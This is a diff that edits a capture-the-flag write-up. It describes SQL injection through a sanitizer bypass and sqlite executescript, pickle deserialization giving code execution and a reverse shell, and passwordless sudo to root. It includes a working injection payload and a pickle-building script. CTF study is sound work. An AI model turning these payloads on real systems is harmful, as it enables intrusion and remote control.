@@ -5,11 +5,11 @@
 
 
 ## Approach
-For this web challenge, we just have a login screen:  
+1. Our challenge begins with a straightforward login screen.
 
-![image](https://github.com/user-attachments/assets/d45669b2-9c38-4e8b-bc3c-e9abf5925bfb)
+   ![image](https://github.com/user-attachments/assets/d45669b2-9c38-4e8b-bc3c-e9abf5925bfb)
 
-There is some sanitization in the form of the `DBClean` function.
+Upon inspection, we find that the login code uses a ```DBClean``` function to sanitize input by removing certain characters, though this is far from foolproof.
 
 ```python
 def DBClean(string):
@@ -18,9 +18,9 @@ def DBClean(string):
     return string.replace("\\", "'")
 ```
 
-However, we can easily bypass this by using `/**/` instead of space and the single quote can be bypassed by escaping it with a backslash.
+This function can be bypassed by replacing spaces with ```/**/``` and escaping the single quote with a backslash.
 
-The `login` function uses [executescript](https://docs.python.org/3/library/sqlite3.html#sqlite3.Connection.executescript) for the login where we have SQL injection instead of using just "execute". This allows us to execute multiple SQL statements.
+2. Digging further, the login function uses  [executescript](https://docs.python.org/3/library/sqlite3.html#sqlite3.Connection.executescript) rather than execute to handle user input, which opens up a vulnerability for SQL injection attacks. By exploiting this, we can run multiple SQL statements.
 
 ```python
 @app.route('/login', methods=['POST'])
@@ -58,7 +58,7 @@ def login_user():
         return redirect(url_for('home'))
 ```
 
-The upload endpoint is nerfed:  
+Interestingly, while file uploads are disabled, the `download` endpoint is open and doesn’t require authentication. This endpoint uses pickle.loads to load file data, which we can manipulate through SQL injection to execute arbitrary code. This would allow us to set up a reverse shell.
 
 ```python
 @app.route('/upload', methods=['POST'])
@@ -67,8 +67,6 @@ def upload_file():
     flash('Sorry, the administrator has temporarily disabled file upload capability.')
     return redirect(url_for('files'))
 ```
-
-But we don't need it because the `download` endpoint doesn't require authentication and it pickle loads the filedata which we could insert into using the SQL injection. We also need to insert an active session for the code to follow the correct logic.
 
 ```python
 @app.route('/download/<filename>/<sessionid>', methods=['GET'])
@@ -96,7 +94,7 @@ def download_file(filename, sessionid):
         return redirect(url_for('files'))
 ```
 
-With the script below we create the pickle data that would execute our payload when it gets loaded and give us a reverse shell.
+4. With pickle.loads at our disposal, we can create serialized data that will execute our payload when loaded. Here, we create a class that leverages os.system to open a reverse shell back to our machine:
 
 ```python
 import base64
@@ -111,7 +109,10 @@ class serial():
 code = pickle.dumps(serial())
 code = base64.b64encode(code)
 revshell = code.decode()
+```
+5. Next, we send a crafted SQL injection payload through the login route, inserting our serialized reverse shell data into the database, and then trigger the download endpoint to execute it:
 
+```python
 url = 'http://challenge.ctf.games:32766/login'
 header = {'Content-Type':'application/x-www-form-urlencoded'}
 data = '''username=s&password=\\';INSERT/**/INTO/**/activesessions/**/VALUES(\\'lazytitan\\',\\'lazytitan\\',\\'time\\');INSERT/**/INTO/**/files/**/VALUES(\\'payload\\',\\'%s\\',NULL);--";''' % revshell
@@ -121,7 +122,7 @@ url2 = 'http://challenge.ctf.games:32766/download/payload/lazytitan'
 requests.get(url2)
 ```
 
-Once we have a foothold, we check our sudo permissions and see we can execute all commands as root without requiring authentication so we sudo bash to root and get the flag:  
+5. Once the reverse shell is active, we check our sudo permissions and find that we can run all commands as root without requiring a password. A quick sudo bash gives us root access, where we find the flag:
 
 ![image](https://github.com/user-attachments/assets/16defa32-0711-41bd-94d6-167e42be516e)
 
